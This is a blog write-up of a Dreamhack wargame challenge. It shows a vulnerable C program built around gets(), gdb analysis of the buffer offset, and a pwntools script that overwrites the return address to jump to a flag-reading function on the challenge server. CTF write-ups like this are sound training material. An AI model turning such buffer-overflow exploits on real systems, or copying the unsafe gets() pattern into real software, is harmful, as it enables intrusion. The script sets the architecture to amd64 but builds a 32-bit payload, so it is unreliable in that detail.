---
layout: post
title: "[dreamhack] exploitation_001"
comments: true
category: wargame
---

## checksec
<img src="/assets/img/exploitation-001/checksec.png" width="600">

Only aslr and NX.<br />
Code section's address is fixed.

***

## C code
```cpp
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}


void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}


void read_flag() {
    system("cat /flag");
}

int main(int argc, char *argv[]) {

    char buf[0x80];

    initialize();

    gets(buf);

    return 0;
}
```
It's really similar to exploitation-000.<br />
The difference is this binary consists read_flag function.<br />
If we overwrite RA with read_flag function's address, then we can read flag.<br />

***

## Debug binary

<img src="/assets/img/exploitation-001/gdb.png" width="500">

In gdb, we can check buf's loacation. It is [ebp-0x80].<br />
Also, we can know read_flag's code location, because there is no PIE.<br />
read_flag's address is 0x80485b9.<br />

Payload will be consists with dummy for overwrite buf and SFP, and read_flag's address for overwrite RA.<br />

***

## Ex code

```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

#r = process('./basic_exploitation_001')
r = remote('host1.dreamhack.games', 10822)

read_flag_addr = 0x80485b9

payload = b'A' * 0x80 + b'B' * 0x4 + p32(read_flag_addr)

r.sendline(payload)

r.interactive()
```